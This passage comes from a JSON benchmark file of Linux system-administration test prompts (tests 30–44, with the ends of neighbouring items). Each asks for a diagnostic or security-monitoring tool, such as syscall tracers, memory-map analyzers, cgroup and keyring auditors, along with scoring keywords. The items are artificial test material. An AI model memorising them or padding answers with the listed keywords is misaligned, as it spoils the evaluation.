      "prompt": "\nCreate an automated incident response script that triggers when a specific alert is received (e.g., from a SIEM):\n1. The script is invoked with a suspicious IP address and a PID.\n2. It immediately captures a memory dump of the given PID using `gcore`.\n3. It isolates the suspicious IP by adding a rule to a network ACL or `iptables` to block all traffic.\n4. It gathers related evidence: active network connections from the PID, its open file handles (`lsof`), and its parent process tree.\n5. It archives all evidence and the memory dump into an encrypted zip file, with the password stored in a secure vault.\n6. It then attempts to gracefully terminate the process.\nThe script should be non-interactive and log every action with precise timestamps.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate an automated incident response script that triggers when a specific alert is received (e.g., from a SIEM):\n1. The script is invoked with a suspicious IP address and a PID.\n2. It immediately captures a memory dump of the given PID using `gcore`.\n3. It isolates the suspicious IP by adding a rule to a network ACL or `iptables` to block all traffic.\n4. It gathers related evidence: active network connections from the PID, its open file handles (`lsof`), and its parent process tree.\n5. It archives all evidence and the memory dump into an encrypted zip file, with the password stored in a secure vault.\n6. It then attempts to gracefully terminate the process.\nThe script should be non-interactive and log every action with precise timestamps.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_30",
      "name": "Test 30: Interactive Infrastructure CLI Report",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild a terminal-based infrastructure report dashboard using a library like Python's `rich` or `blessed`.\n1. The dashboard should have multiple panels that update in near real-time (e.g., every 5 seconds).\n2. One panel should show overall service status (by pinging a list of hosts).\n3. A second panel should display a scrolling table of the top 5 processes by CPU and memory usage.\n4. A third panel should tail the last 10 lines of `/var/log/syslog`.\n5. The application should handle user input: pressing 'q' should quit gracefully.\nThe output should be visually organized and use colors to indicate status (e.g., green for 'UP', red for 'DOWN').\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a terminal-based infrastructure report dashboard using a library like Python's `rich` or `blessed`.\n1. The dashboard should have multiple panels that update in near real-time (e.g., every 5 seconds).\n2. One panel should show overall service status (by pinging a list of hosts).\n3. A second panel should display a scrolling table of the top 5 processes by CPU and memory usage.\n4. A third panel should tail the last 10 lines of `/var/log/syslog`.\n5. The application should handle user input: pressing 'q' should quit gracefully.\nThe output should be visually organized and use colors to indicate status (e.g., green for 'UP', red for 'DOWN').\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_31",
      "name": "Test 31: Kernel Module Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nWrite a script that analyzes loaded kernel modules and their dependencies:\n1. Parse /proc/modules to get all loaded modules with their memory usage, reference count, and dependencies\n2. For each module, use modinfo to extract: version, description, author, license, and parameters\n3. Identify modules that are loaded but have no dependent modules using them (ref count = 0)\n4. Check if any third-party modules (not in /lib/modules/$(uname -r)/kernel) are loaded\n5. Generate a graphviz dot file showing the module dependency tree with memory usage annotations\n6. Flag any modules that have tainted the kernel and decode the taint flags (P=proprietary, O=out-of-tree, etc.)\n7. Check for module signature verification status and report unsigned modules\nInclude proper parsing of kernel taint flags from /proc/sys/kernel/tainted.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a script that analyzes loaded kernel modules and their dependencies:\n1. Parse /proc/modules to get all loaded modules with their memory usage, reference count, and dependencies\n2. For each module, use modinfo to extract: version, description, author, license, and parameters\n3. Identify modules that are loaded but have no dependent modules using them (ref count = 0)\n4. Check if any third-party modules (not in /lib/modules/$(uname -r)/kernel) are loaded\n5. Generate a graphviz dot file showing the module dependency tree with memory usage annotations\n6. Flag any modules that have tainted the kernel and decode the taint flags (P=proprietary, O=out-of-tree, etc.)\n7. Check for module signature verification status and report unsigned modules\nInclude proper parsing of kernel taint flags from /proc/sys/kernel/tainted.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_32",
      "name": "Test 32: Memory Map Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a comprehensive process memory analyzer:\n1. Parse /proc/PID/maps to understand the memory layout of a given process\n2. Categorize memory regions: heap, stack, shared libraries, anonymous mappings, etc.\n3. For each shared library, check if ASLR is effective by comparing load addresses\n4. Identify potentially suspicious memory regions (RWX permissions, unusual paths)\n5. Calculate actual memory usage using /proc/PID/smaps including PSS (Proportional Set Size)\n6. Detect memory leaks by tracking anonymous memory growth over time\n7. Generate a visual representation of the memory layout with security annotations\n8. Check for common injection patterns (e.g., memory regions not backed by files)\nInclude detection of process hollowing and other memory-based attack indicators.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a comprehensive process memory analyzer:\n1. Parse /proc/PID/maps to understand the memory layout of a given process\n2. Categorize memory regions: heap, stack, shared libraries, anonymous mappings, etc.\n3. For each shared library, check if ASLR is effective by comparing load addresses\n4. Identify potentially suspicious memory regions (RWX permissions, unusual paths)\n5. Calculate actual memory usage using /proc/PID/smaps including PSS (Proportional Set Size)\n6. Detect memory leaks by tracking anonymous memory growth over time\n7. Generate a visual representation of the memory layout with security annotations\n8. Check for common injection patterns (e.g., memory regions not backed by files)\nInclude detection of process hollowing and other memory-based attack indicators.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_33",
      "name": "Test 33: Syscall Tracing and Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild a syscall analysis tool using ptrace:\n1. Attach to a running process and trace all system calls\n2. Categorize syscalls by type: file I/O, network, process management, memory, etc.\n3. Track file descriptors throughout their lifecycle (open->read/write->close)\n4. Detect suspicious patterns: excessive failed syscalls, privilege escalation attempts\n5. Build a syscall frequency histogram and identify anomalies\n6. Track time spent in each syscall and identify performance bottlenecks\n7. Generate a timeline of security-relevant events (file access, network connections, exec calls)\n8. Implement syscall filtering to reduce noise (e.g., ignore certain common syscalls)\nOutput both a detailed log and a summary report with security and performance insights.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a syscall analysis tool using ptrace:\n1. Attach to a running process and trace all system calls\n2. Categorize syscalls by type: file I/O, network, process management, memory, etc.\n3. Track file descriptors throughout their lifecycle (open->read/write->close)\n4. Detect suspicious patterns: excessive failed syscalls, privilege escalation attempts\n5. Build a syscall frequency histogram and identify anomalies\n6. Track time spent in each syscall and identify performance bottlenecks\n7. Generate a timeline of security-relevant events (file access, network connections, exec calls)\n8. Implement syscall filtering to reduce noise (e.g., ignore certain common syscalls)\nOutput both a detailed log and a summary report with security and performance insights.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_34",
      "name": "Test 34: CPU Performance Counter Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nWrite a script using perf_event_open to access CPU performance counters:\n1. Set up performance counters for: cache misses, branch mispredictions, CPU cycles, instructions\n2. Monitor these counters for a target process or system-wide\n3. Calculate derived metrics: IPC (instructions per cycle), cache hit rate, branch prediction accuracy\n4. Detect performance anomalies that might indicate security issues (e.g., cache side-channel attacks)\n5. Track context switches and their impact on cache performance\n6. Monitor CPU frequency scaling and thermal throttling events\n7. Correlate performance degradation with system events (I/O, interrupts)\n8. Generate alerts for abnormal performance patterns that could indicate crypto-mining or DoS\nInclude proper handling of counter overflow and multiplexing.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a script using perf_event_open to access CPU performance counters:\n1. Set up performance counters for: cache misses, branch mispredictions, CPU cycles, instructions\n2. Monitor these counters for a target process or system-wide\n3. Calculate derived metrics: IPC (instructions per cycle), cache hit rate, branch prediction accuracy\n4. Detect performance anomalies that might indicate security issues (e.g., cache side-channel attacks)\n5. Track context switches and their impact on cache performance\n6. Monitor CPU frequency scaling and thermal throttling events\n7. Correlate performance degradation with system events (I/O, interrupts)\n8. Generate alerts for abnormal performance patterns that could indicate crypto-mining or DoS\nInclude proper handling of counter overflow and multiplexing.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_35",
      "name": "Test 35: Block Device I/O Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a comprehensive block device I/O analyzer:\n1. Parse /sys/block/*/stat to get detailed I/O statistics for all block devices\n2. Calculate IOPS, throughput, average request size, and queue depth\n3. Monitor I/O latency using /proc/diskstats and identify slow devices\n4. Track I/O patterns: sequential vs random, read vs write ratios\n5. Use blktrace to capture detailed I/O traces and analyze request merging efficiency\n6. Identify processes generating the most I/O using /proc/PID/io\n7. Detect I/O storms and correlate with system events\n8. Monitor device mapper statistics for LVM/RAID performance\n9. Check for I/O errors and failing devices in kernel logs\nGenerate both real-time metrics and historical analysis with anomaly detection.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a comprehensive block device I/O analyzer:\n1. Parse /sys/block/*/stat to get detailed I/O statistics for all block devices\n2. Calculate IOPS, throughput, average request size, and queue depth\n3. Monitor I/O latency using /proc/diskstats and identify slow devices\n4. Track I/O patterns: sequential vs random, read vs write ratios\n5. Use blktrace to capture detailed I/O traces and analyze request merging efficiency\n6. Identify processes generating the most I/O using /proc/PID/io\n7. Detect I/O storms and correlate with system events\n8. Monitor device mapper statistics for LVM/RAID performance\n9. Check for I/O errors and failing devices in kernel logs\nGenerate both real-time metrics and historical analysis with anomaly detection.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_36",
      "name": "Test 36: Network Stack Internals",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_networking",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux networking",
      "prompt": "\nBuild a deep network stack analyzer:\n1. Parse /proc/net/* to extract detailed network statistics\n2. Monitor TCP connection states and detect anomalies (SYN floods, TIME_WAIT accumulation)\n3. Track network buffer usage (socket buffers, ring buffers) and detect exhaustion\n4. Analyze netfilter connection tracking table for NAT/firewall performance\n5. Monitor interrupt distribution across CPUs for network interfaces\n6. Track TCP retransmissions, out-of-order packets, and duplicate ACKs\n7. Detect network stack tuning issues (small buffers, suboptimal congestion control)\n8. Use ss and netstat data to identify connection leaks\n9. Monitor network namespace usage and inter-namespace communication\nInclude eBPF hooks to trace packet flow through the network stack.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a deep network stack analyzer:\n1. Parse /proc/net/* to extract detailed network statistics\n2. Monitor TCP connection states and detect anomalies (SYN floods, TIME_WAIT accumulation)\n3. Track network buffer usage (socket buffers, ring buffers) and detect exhaustion\n4. Analyze netfilter connection tracking table for NAT/firewall performance\n5. Monitor interrupt distribution across CPUs for network interfaces\n6. Track TCP retransmissions, out-of-order packets, and duplicate ACKs\n7. Detect network stack tuning issues (small buffers, suboptimal congestion control)\n8. Use ss and netstat data to identify connection leaks\n9. Monitor network namespace usage and inter-namespace communication\nInclude eBPF hooks to trace packet flow through the network stack.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "security",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_37",
      "name": "Test 37: Process Scheduler Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a process scheduler analyzer:\n1. Monitor /proc/sched_debug to understand scheduler behavior\n2. Track process migration between CPUs and NUMA nodes\n3. Analyze scheduling latency and identify processes experiencing starvation\n4. Monitor real-time process behavior and deadline misses\n5. Track CPU affinity settings and their effectiveness\n6. Identify priority inversion scenarios\n7. Monitor cgroup CPU accounting and quota enforcement\n8. Analyze the impact of kernel preemption on latency-sensitive workloads\n9. Detect scheduler anomalies that might indicate malicious activity\nGenerate recommendations for scheduler tuning based on workload characteristics.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a process scheduler analyzer:\n1. Monitor /proc/sched_debug to understand scheduler behavior\n2. Track process migration between CPUs and NUMA nodes\n3. Analyze scheduling latency and identify processes experiencing starvation\n4. Monitor real-time process behavior and deadline misses\n5. Track CPU affinity settings and their effectiveness\n6. Identify priority inversion scenarios\n7. Monitor cgroup CPU accounting and quota enforcement\n8. Analyze the impact of kernel preemption on latency-sensitive workloads\n9. Detect scheduler anomalies that might indicate malicious activity\nGenerate recommendations for scheduler tuning based on workload characteristics.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_38",
      "name": "Test 38: Virtual Memory Subsystem Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nDevelop a comprehensive virtual memory analyzer:\n1. Parse /proc/vmstat and /proc/meminfo to track memory subsystem behavior\n2. Monitor page fault rates (minor vs major) and their impact on performance\n3. Track swap usage patterns and identify thrashing conditions\n4. Analyze transparent huge page (THP) usage and effectiveness\n5. Monitor memory compaction events and fragmentation levels\n6. Track dirty page writeback behavior and I/O patterns\n7. Analyze NUMA memory allocation and migration statistics\n8. Detect memory pressure situations before OOM killer activation\n9. Monitor kernel memory usage (slab allocator statistics)\nInclude predictive analytics for memory exhaustion scenarios.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nDevelop a comprehensive virtual memory analyzer:\n1. Parse /proc/vmstat and /proc/meminfo to track memory subsystem behavior\n2. Monitor page fault rates (minor vs major) and their impact on performance\n3. Track swap usage patterns and identify thrashing conditions\n4. Analyze transparent huge page (THP) usage and effectiveness\n5. Monitor memory compaction events and fragmentation levels\n6. Track dirty page writeback behavior and I/O patterns\n7. Analyze NUMA memory allocation and migration statistics\n8. Detect memory pressure situations before OOM killer activation\n9. Monitor kernel memory usage (slab allocator statistics)\nInclude predictive analytics for memory exhaustion scenarios.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "technical",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_39",
      "name": "Test 39: Security Module Integration",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_security",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux security",
      "prompt": "\nWrite a script to analyze Linux Security Module (LSM) configurations:\n1. Detect which LSMs are active (SELinux, AppArmor, SMACK, etc.)\n2. For SELinux: analyze policy violations in audit log, check for domains in permissive mode\n3. For AppArmor: parse loaded profiles, check for complain mode profiles\n4. Analyze capability usage by processes (both effective and permitted)\n5. Check for processes with dangerous capability combinations\n6. Monitor security module state changes and policy reloads\n7. Track security context transitions and domain changes\n8. Identify processes running unconfined or with elevated privileges\n9. Generate a security posture report with remediation recommendations\nInclude integration with auditd for comprehensive security event tracking.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a script to analyze Linux Security Module (LSM) configurations:\n1. Detect which LSMs are active (SELinux, AppArmor, SMACK, etc.)\n2. For SELinux: analyze policy violations in audit log, check for domains in permissive mode\n3. For AppArmor: parse loaded profiles, check for complain mode profiles\n4. Analyze capability usage by processes (both effective and permitted)\n5. Check for processes with dangerous capability combinations\n6. Monitor security module state changes and policy reloads\n7. Track security context transitions and domain changes\n8. Identify processes running unconfined or with elevated privileges\n9. Generate a security posture report with remediation recommendations\nInclude integration with auditd for comprehensive security event tracking.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "security",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_40",
      "name": "Test 40: Interrupt and IRQ Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild an interrupt handling analyzer:\n1. Parse /proc/interrupts to track interrupt distribution across CPUs\n2. Identify interrupt storms and their sources\n3. Monitor IRQ affinity settings and balance effectiveness\n4. Track softirq processing time and identify bottlenecks\n5. Analyze MSI/MSI-X interrupt usage for PCI devices\n6. Detect interrupt sharing conflicts affecting performance\n7. Monitor threaded IRQ handler performance\n8. Track interrupt coalescing effectiveness for network interfaces\n9. Identify real-time latency issues caused by interrupt handling\nGenerate recommendations for interrupt tuning and CPU isolation.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild an interrupt handling analyzer:\n1. Parse /proc/interrupts to track interrupt distribution across CPUs\n2. Identify interrupt storms and their sources\n3. Monitor IRQ affinity settings and balance effectiveness\n4. Track softirq processing time and identify bottlenecks\n5. Analyze MSI/MSI-X interrupt usage for PCI devices\n6. Detect interrupt sharing conflicts affecting performance\n7. Monitor threaded IRQ handler performance\n8. Track interrupt coalescing effectiveness for network interfaces\n9. Identify real-time latency issues caused by interrupt handling\nGenerate recommendations for interrupt tuning and CPU isolation.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_41",
      "name": "Test 41: Filesystem Internal Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a filesystem internals analyzer:\n1. For ext4: analyze journal status, inode usage, and fragmentation levels\n2. For XFS: monitor allocation groups, delayed allocation, and log performance\n3. For Btrfs: check scrub status, balance operations, and snapshot overhead\n4. Track inode cache and dentry cache effectiveness\n5. Monitor filesystem-specific caches and their hit rates\n6. Analyze mount options and their performance/security implications\n7. Detect filesystem corruption indicators in kernel logs\n8. Track filesystem freeze/thaw operations and their impact\n9. Monitor quota usage and enforcement\nInclude filesystem-specific health checks and optimization recommendations.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a filesystem internals analyzer:\n1. For ext4: analyze journal status, inode usage, and fragmentation levels\n2. For XFS: monitor allocation groups, delayed allocation, and log performance\n3. For Btrfs: check scrub status, balance operations, and snapshot overhead\n4. Track inode cache and dentry cache effectiveness\n5. Monitor filesystem-specific caches and their hit rates\n6. Analyze mount options and their performance/security implications\n7. Detect filesystem corruption indicators in kernel logs\n8. Track filesystem freeze/thaw operations and their impact\n9. Monitor quota usage and enforcement\nInclude filesystem-specific health checks and optimization recommendations.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "technical",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_42",
      "name": "Test 42: Control Group (cgroup) Deep Dive",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild a comprehensive cgroup analyzer for both v1 and v2:\n1. Map the complete cgroup hierarchy and controller attachments\n2. Track resource usage (CPU, memory, I/O) per cgroup with historical data\n3. Monitor cgroup limit enforcement and throttling events\n4. Detect cgroup escape attempts and privilege escalation\n5. Analyze systemd slice/scope/service resource consumption\n6. Track cgroup migration events and their performance impact\n7. Monitor memory pressure notifications (cgroup v2)\n8. Analyze CPU bandwidth control and quota burn rates\n9. Detect resource starvation within cgroups\n10. Generate alerts for cgroup-based resource attacks\nInclude visualization of the cgroup hierarchy with resource usage heatmaps.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a comprehensive cgroup analyzer for both v1 and v2:\n1. Map the complete cgroup hierarchy and controller attachments\n2. Track resource usage (CPU, memory, I/O) per cgroup with historical data\n3. Monitor cgroup limit enforcement and throttling events\n4. Detect cgroup escape attempts and privilege escalation\n5. Analyze systemd slice/scope/service resource consumption\n6. Track cgroup migration events and their performance impact\n7. Monitor memory pressure notifications (cgroup v2)\n8. Analyze CPU bandwidth control and quota burn rates\n9. Detect resource starvation within cgroups\n10. Generate alerts for cgroup-based resource attacks\nInclude visualization of the cgroup hierarchy with resource usage heatmaps.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_43",
      "name": "Test 43: Kernel Keyring Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nWrite a kernel keyring security analyzer:\n1. Enumerate all keyrings (session, process, thread, user, user-session)\n2. List keys in each keyring with their types, descriptions, and permissions\n3. Identify expired or revoked keys still in keyrings\n4. Check for overly permissive key access permissions\n5. Track key usage patterns and access attempts\n6. Monitor keyring quota usage and potential DoS vectors\n7. Detect suspicious key types or descriptions (potential malware indicators)\n8. Analyze encrypted key dependencies and trust chains\n9. Check for keys that should be in kernel lockdown\nInclude integration with IMA/EVM for system integrity verification.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a kernel keyring security analyzer:\n1. Enumerate all keyrings (session, process, thread, user, user-session)\n2. List keys in each keyring with their types, descriptions, and permissions\n3. Identify expired or revoked keys still in keyrings\n4. Check for overly permissive key access permissions\n5. Track key usage patterns and access attempts\n6. Monitor keyring quota usage and potential DoS vectors\n7. Detect suspicious key types or descriptions (potential malware indicators)\n8. Analyze encrypted key dependencies and trust chains\n9. Check for keys that should be in kernel lockdown\nInclude integration with IMA/EVM for system integrity verification.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_44",
      "name": "Test 44: NUMA System Optimization",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a NUMA-aware system optimizer:\n1. Map system NUMA topology including nodes, CPUs, and memory\n2. Analyze per-node memory usage and identify imbalances\n3. Track inter-node memory access latency and bandwidth\n4. Monitor NUMA page migration statistics and effectiveness\n5. Identify processes with poor NUMA locality\n6. Generate optimal CPU/memory pinning recommendations\n7. Analyze NUMA-aware scheduler decisions\n8. Track remote memory access penalties\n9. Monitor kernel NUMA balancing effectiveness\n10. Detect NUMA-related performance regressions\nInclude automated NUMA policy recommendations for different workload types.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a NUMA-aware system optimizer:\n1. Map system NUMA topology including nodes, CPUs, and memory\n2. Analyze per-node memory usage and identify imbalances\n3. Track inter-node memory access latency and bandwidth\n4. Monitor NUMA page migration statistics and effectiveness\n5. Identify processes with poor NUMA locality\n6. Generate optimal CPU/memory pinning recommendations\n7. Analyze NUMA-aware scheduler decisions\n8. Track remote memory access penalties\n9. Monitor kernel NUMA balancing effectiveness\n10. Detect NUMA-related performance regressions\nInclude automated NUMA policy recommendations for different workload types.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "technical",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_45",
      "name": "Test 45: Boot Process Security Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_security",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux security",
